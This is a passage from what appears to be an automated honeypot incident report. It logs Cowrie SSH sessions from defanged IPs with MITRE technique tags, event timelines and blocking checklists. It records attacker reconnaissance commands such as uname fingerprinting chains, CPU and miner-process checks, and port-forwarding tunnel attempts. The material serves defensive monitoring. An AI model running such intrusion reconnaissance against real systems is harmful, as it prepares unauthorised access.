- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-796e27f1c0c2

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-17 01:46 |
| **Last Seen** | 2026-08-17 01:47 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:46:47` | `cowrie.session.connect` |
| `2026-08-17 01:46:53` | `cowrie.client.version` |
| `2026-08-17 01:46:53` | `cowrie.client.kex` |
| `2026-08-17 01:47:17` | `cowrie.login.success` |
| `2026-08-17 01:47:31` | `cowrie.session.params` |
| `2026-08-17 01:47:31` | `cowrie.command.input` |
| `2026-08-17 01:47:37` | `cowrie.log.closed` |
| `2026-08-17 01:47:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef46f7a19f0c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-17 01:48 |
| **Last Seen** | 2026-08-17 01:48 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:48:45` | `cowrie.session.connect` |
| `2026-08-17 01:48:46` | `cowrie.client.version` |
| `2026-08-17 01:48:46` | `cowrie.client.kex` |
| `2026-08-17 01:48:51` | `cowrie.login.success` |
| `2026-08-17 01:48:54` | `cowrie.session.params` |
| `2026-08-17 01:48:54` | `cowrie.command.input` |
| `2026-08-17 01:48:54` | `cowrie.command.input` |
| `2026-08-17 01:48:54` | `cowrie.command.input` |
| `2026-08-17 01:48:54` | `cowrie.command.input` |
| `2026-08-17 01:48:54` | `cowrie.command.input` |
| `2026-08-17 01:48:54` | `cowrie.command.success` |
| `2026-08-17 01:48:54` | `cowrie.command.input` |
| `2026-08-17 01:48:54` | `cowrie.command.input` |
| `2026-08-17 01:48:54` | `cowrie.command.input` |
| `2026-08-17 01:48:54` | `cowrie.command.input` |
| `2026-08-17 01:48:55` | `cowrie.log.closed` |
| `2026-08-17 01:48:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65519e3b66a6

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 01:49 |
| **Last Seen** | 2026-08-17 01:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:49:17` | `cowrie.session.connect` |
| `2026-08-17 01:49:17` | `cowrie.client.version` |
| `2026-08-17 01:49:17` | `cowrie.client.kex` |
| `2026-08-17 01:49:18` | `cowrie.login.success` |
| `2026-08-17 01:49:18` | `cowrie.session.params` |
| `2026-08-17 01:49:18` | `cowrie.command.input` |
| `2026-08-17 01:49:19` | `cowrie.log.closed` |
| `2026-08-17 01:49:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed333e889fc7

| Field | Detail |
|---|---|
| **Source IP** | `203.75.170[.]63` |
| **First Seen** | 2026-08-17 01:49 |
| **Last Seen** | 2026-08-17 01:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:49:53` | `cowrie.session.connect` |
| `2026-08-17 01:49:53` | `cowrie.client.version` |
| `2026-08-17 01:49:53` | `cowrie.client.kex` |
| `2026-08-17 01:49:56` | `cowrie.login.success` |
| `2026-08-17 01:49:56` | `cowrie.direct-tcpip.request` |
| `2026-08-17 01:50:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.75.170[.]63` to AbuseIPDB if not already reported
- [ ] Block `203.75.170[.]63` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56d12c97774b

| Field | Detail |
|---|---|
| **Source IP** | `60.173.105[.]206` |
| **First Seen** | 2026-08-17 01:50 |
| **Last Seen** | 2026-08-17 01:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:50:02` | `cowrie.session.connect` |
| `2026-08-17 01:50:03` | `cowrie.client.version` |
| `2026-08-17 01:50:03` | `cowrie.client.kex` |
| `2026-08-17 01:50:05` | `cowrie.login.success` |
| `2026-08-17 01:50:06` | `cowrie.direct-tcpip.request` |
| `2026-08-17 01:50:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.173.105[.]206` to AbuseIPDB if not already reported
- [ ] Block `60.173.105[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e36def3e424

| Field | Detail |
|---|---|
| **Source IP** | `222.174.184[.]86` |
| **First Seen** | 2026-08-17 01:50 |
| **Last Seen** | 2026-08-17 01:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:50:51` | `cowrie.session.connect` |
| `2026-08-17 01:50:52` | `cowrie.client.version` |
| `2026-08-17 01:50:52` | `cowrie.client.kex` |
| `2026-08-17 01:50:54` | `cowrie.login.success` |
| `2026-08-17 01:50:55` | `cowrie.direct-tcpip.request` |
| `2026-08-17 01:51:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.174.184[.]86` to AbuseIPDB if not already reported
- [ ] Block `222.174.184[.]86` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84af4868e8ab

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-17 01:51 |
| **Last Seen** | 2026-08-17 01:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:51:55` | `cowrie.session.connect` |
| `2026-08-17 01:51:55` | `cowrie.client.version` |
| `2026-08-17 01:51:55` | `cowrie.client.kex` |
| `2026-08-17 01:51:55` | `cowrie.login.success` |
| `2026-08-17 01:51:55` | `cowrie.direct-tcpip.request` |
| `2026-08-17 01:51:56` | `cowrie.direct-tcpip.data` |
| `2026-08-17 01:51:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47eae1cf7d1b

| Field | Detail |
|---|---|
| **Source IP** | `83.166.50[.]15` |
| **First Seen** | 2026-08-17 01:52 |
| **Last Seen** | 2026-08-17 01:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:52:08` | `cowrie.session.connect` |
| `2026-08-17 01:52:08` | `cowrie.client.version` |
| `2026-08-17 01:52:08` | `cowrie.client.kex` |
| `2026-08-17 01:52:09` | `cowrie.login.success` |
| `2026-08-17 01:52:10` | `cowrie.direct-tcpip.request` |
| `2026-08-17 01:52:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.166.50[.]15` to AbuseIPDB if not already reported
- [ ] Block `83.166.50[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93bb4580a583

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-08-17 01:52 |
| **Last Seen** | 2026-08-17 01:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:52:25` | `cowrie.session.connect` |
| `2026-08-17 01:52:26` | `cowrie.client.version` |
| `2026-08-17 01:52:26` | `cowrie.client.kex` |
| `2026-08-17 01:52:28` | `cowrie.login.success` |
| `2026-08-17 01:52:29` | `cowrie.direct-tcpip.request` |
| `2026-08-17 01:52:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e33d0309351

| Field | Detail |
|---|---|
| **Source IP** | `222.222.124[.]164` |
| **First Seen** | 2026-08-17 01:52 |
| **Last Seen** | 2026-08-17 01:52 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:52:34` | `cowrie.session.connect` |
| `2026-08-17 01:52:35` | `cowrie.client.version` |
| `2026-08-17 01:52:35` | `cowrie.client.kex` |
| `2026-08-17 01:52:39` | `cowrie.login.success` |
| `2026-08-17 01:52:40` | `cowrie.direct-tcpip.request` |
| `2026-08-17 01:52:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.222.124[.]164` to AbuseIPDB if not already reported
- [ ] Block `222.222.124[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-368ebd101102

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-17 02:04 |
| **Last Seen** | 2026-08-17 02:05 |
| **Session Duration** | 57s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:04:13` | `cowrie.session.connect` |
| `2026-08-17 02:04:16` | `cowrie.client.version` |
| `2026-08-17 02:04:16` | `cowrie.client.kex` |
| `2026-08-17 02:04:48` | `cowrie.login.success` |
| `2026-08-17 02:05:06` | `cowrie.session.params` |
| `2026-08-17 02:05:06` | `cowrie.command.input` |
| `2026-08-17 02:05:11` | `cowrie.log.closed` |
| `2026-08-17 02:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fbd3ed06a30

| Field | Detail |
|---|---|
| **Source IP** | `202.111.183[.]30` |
| **First Seen** | 2026-08-17 02:05 |
| **Last Seen** | 2026-08-17 02:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:05:35` | `cowrie.session.connect` |
| `2026-08-17 02:05:36` | `cowrie.client.version` |
| `2026-08-17 02:05:36` | `cowrie.client.kex` |
| `2026-08-17 02:05:38` | `cowrie.login.success` |
| `2026-08-17 02:05:39` | `cowrie.direct-tcpip.request` |
| `2026-08-17 02:05:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.111.183[.]30` to AbuseIPDB if not already reported
- [ ] Block `202.111.183[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b02d16ffb87

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-08-17 02:05 |
| **Last Seen** | 2026-08-17 02:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:05:44` | `cowrie.session.connect` |
| `2026-08-17 02:05:45` | `cowrie.client.version` |
| `2026-08-17 02:05:45` | `cowrie.client.kex` |
| `2026-08-17 02:05:47` | `cowrie.login.success` |
| `2026-08-17 02:05:48` | `cowrie.direct-tcpip.request` |
| `2026-08-17 02:05:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92c9e55a27ec

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 02:08 |
| **Last Seen** | 2026-08-17 02:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:08:23` | `cowrie.session.connect` |
| `2026-08-17 02:08:23` | `cowrie.client.version` |
| `2026-08-17 02:08:23` | `cowrie.client.kex` |
| `2026-08-17 02:08:24` | `cowrie.login.success` |
| `2026-08-17 02:08:25` | `cowrie.session.params` |
| `2026-08-17 02:08:25` | `cowrie.command.input` |
| `2026-08-17 02:08:25` | `cowrie.log.closed` |
| `2026-08-17 02:08:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd0d10d33621

| Field | Detail |
|---|---|
| **Source IP** | `122.187.237[.]122` |
| **First Seen** | 2026-08-17 02:19 |
| **Last Seen** | 2026-08-17 02:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:19:06` | `cowrie.session.connect` |
| `2026-08-17 02:19:07` | `cowrie.client.version` |
| `2026-08-17 02:19:07` | `cowrie.client.kex` |
| `2026-08-17 02:19:10` | `cowrie.login.success` |
| `2026-08-17 02:19:10` | `cowrie.direct-tcpip.request` |
| `2026-08-17 02:19:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.237[.]122` to AbuseIPDB if not already reported
- [ ] Block `122.187.237[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f3af5f45622

| Field | Detail |
|---|---|
| **Source IP** | `65.20.175[.]6` |
| **First Seen** | 2026-08-17 02:19 |
| **Last Seen** | 2026-08-17 02:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:19:21` | `cowrie.session.connect` |
| `2026-08-17 02:19:21` | `cowrie.client.version` |
| `2026-08-17 02:19:21` | `cowrie.client.kex` |
| `2026-08-17 02:19:23` | `cowrie.login.success` |
| `2026-08-17 02:19:23` | `cowrie.direct-tcpip.request` |
| `2026-08-17 02:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.175[.]6` to AbuseIPDB if not already reported
- [ ] Block `65.20.175[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f09d907d77b

| Field | Detail |
|---|---|
| **Source IP** | `64.62.156[.]80` |
| **First Seen** | 2026-08-17 02:22 |
| **Last Seen** | 2026-08-17 02:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:22:01` | `cowrie.session.connect` |
| `2026-08-17 02:22:01` | `cowrie.login.success` |
| `2026-08-17 02:22:02` | `cowrie.session.params` |
| `2026-08-17 02:22:02` | `cowrie.command.input` |
| `2026-08-17 02:22:02` | `cowrie.command.input` |
| `2026-08-17 02:22:02` | `cowrie.command.failed` |
| `2026-08-17 02:22:02` | `cowrie.command.input` |
| `2026-08-17 02:22:02` | `cowrie.command.failed` |
| `2026-08-17 02:22:02` | `cowrie.command.input` |
| `2026-08-17 02:22:02` | `cowrie.log.closed` |
| `2026-08-17 02:22:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.62.156[.]80` to AbuseIPDB if not already reported
- [ ] Block `64.62.156[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a1afa131a91

| Field | Detail |
|---|---|
| **Source IP** | `73.147.19[.]171` |
| **First Seen** | 2026-08-17 02:23 |
| **Last Seen** | 2026-08-17 02:24 |
| **Session Duration** | 36s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:23:45` | `cowrie.session.connect` |
| `2026-08-17 02:23:45` | `cowrie.client.version` |
| `2026-08-17 02:23:45` | `cowrie.client.kex` |
| `2026-08-17 02:23:45` | `cowrie.login.failed` |
| `2026-08-17 02:23:46` | `cowrie.login.success` |
| `2026-08-17 02:23:47` | `cowrie.session.params` |
| `2026-08-17 02:23:47` | `cowrie.command.input` |
| `2026-08-17 02:23:47` | `cowrie.command.failed` |
| `2026-08-17 02:23:47` | `cowrie.log.closed` |
| `2026-08-17 02:23:48` | `cowrie.session.params` |
| `2026-08-17 02:23:48` | `cowrie.command.input` |
| `2026-08-17 02:23:48` | `cowrie.log.closed` |
| `2026-08-17 02:23:48` | `cowrie.session.params` |
| `2026-08-17 02:23:48` | `cowrie.command.input` |
| `2026-08-17 02:23:48` | `cowrie.log.closed` |
| `2026-08-17 02:23:49` | `cowrie.session.params` |
| `2026-08-17 02:23:49` | `cowrie.command.input` |
| `2026-08-17 02:23:49` | `cowrie.log.closed` |
| `2026-08-17 02:23:50` | `cowrie.session.params` |
| `2026-08-17 02:23:50` | `cowrie.command.input` |
| `2026-08-17 02:23:50` | `cowrie.log.closed` |
| `2026-08-17 02:23:50` | `cowrie.session.params` |
| `2026-08-17 02:23:50` | `cowrie.command.input` |
| `2026-08-17 02:23:51` | `cowrie.log.closed` |
| `2026-08-17 02:23:51` | `cowrie.session.params` |
| `2026-08-17 02:23:51` | `cowrie.command.input` |
| `2026-08-17 02:23:51` | `cowrie.log.closed` |
| `2026-08-17 02:23:52` | `cowrie.session.params` |
| `2026-08-17 02:23:52` | `cowrie.command.input` |
| `2026-08-17 02:23:52` | `cowrie.log.closed` |
| `2026-08-17 02:23:53` | `cowrie.session.params` |
| `2026-08-17 02:23:53` | `cowrie.command.input` |
| `2026-08-17 02:23:53` | `cowrie.log.closed` |
| `2026-08-17 02:24:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.147.19[.]171` to AbuseIPDB if not already reported
- [ ] Block `73.147.19[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fa450184c75

| Field | Detail |
|---|---|
| **Source IP** | `62.220.104[.]155` |
| **First Seen** | 2026-08-17 02:24 |
| **Last Seen** | 2026-08-17 02:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:24:24` | `cowrie.session.connect` |
| `2026-08-17 02:24:24` | `cowrie.client.version` |
| `2026-08-17 02:24:24` | `cowrie.client.kex` |
| `2026-08-17 02:24:25` | `cowrie.login.success` |
| `2026-08-17 02:24:26` | `cowrie.direct-tcpip.request` |
| `2026-08-17 02:24:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.220.104[.]155` to AbuseIPDB if not already reported
- [ ] Block `62.220.104[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6d9467685e4

| Field | Detail |
|---|---|
| **Source IP** | `170.247.3[.]15` |
| **First Seen** | 2026-08-17 02:24 |
| **Last Seen** | 2026-08-17 02:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:24:35` | `cowrie.session.connect` |
| `2026-08-17 02:24:36` | `cowrie.client.version` |
| `2026-08-17 02:24:36` | `cowrie.client.kex` |
| `2026-08-17 02:24:37` | `cowrie.login.success` |
| `2026-08-17 02:24:38` | `cowrie.direct-tcpip.request` |
| `2026-08-17 02:24:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.247.3[.]15` to AbuseIPDB if not already reported
- [ ] Block `170.247.3[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-039273ec4833

| Field | Detail |
|---|---|
| **Source IP** | `117.248.201[.]39` |
| **First Seen** | 2026-08-17 02:25 |
| **Last Seen** | 2026-08-17 02:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:25:45` | `cowrie.session.connect` |
| `2026-08-17 02:25:45` | `cowrie.client.version` |
| `2026-08-17 02:25:45` | `cowrie.client.kex` |
| `2026-08-17 02:25:47` | `cowrie.login.success` |
| `2026-08-17 02:25:47` | `cowrie.direct-tcpip.request` |
| `2026-08-17 02:25:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.248.201[.]39` to AbuseIPDB if not already reported
- [ ] Block `117.248.201[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8226ffc151e6

| Field | Detail |
|---|---|
| **Source IP** | `117.241.77[.]78` |
| **First Seen** | 2026-08-17 02:25 |
| **Last Seen** | 2026-08-17 02:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:25:53` | `cowrie.session.connect` |
| `2026-08-17 02:25:54` | `cowrie.client.version` |
| `2026-08-17 02:25:54` | `cowrie.client.kex` |
| `2026-08-17 02:25:56` | `cowrie.login.success` |
| `2026-08-17 02:25:57` | `cowrie.direct-tcpip.request` |
| `2026-08-17 02:26:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.241.77[.]78` to AbuseIPDB if not already reported
- [ ] Block `117.241.77[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-030723f3b7b3

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 02:27 |
| **Last Seen** | 2026-08-17 02:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:27:29` | `cowrie.session.connect` |
| `2026-08-17 02:27:29` | `cowrie.client.version` |
| `2026-08-17 02:27:30` | `cowrie.client.kex` |
| `2026-08-17 02:27:30` | `cowrie.login.success` |
| `2026-08-17 02:27:31` | `cowrie.session.params` |
| `2026-08-17 02:27:31` | `cowrie.command.input` |
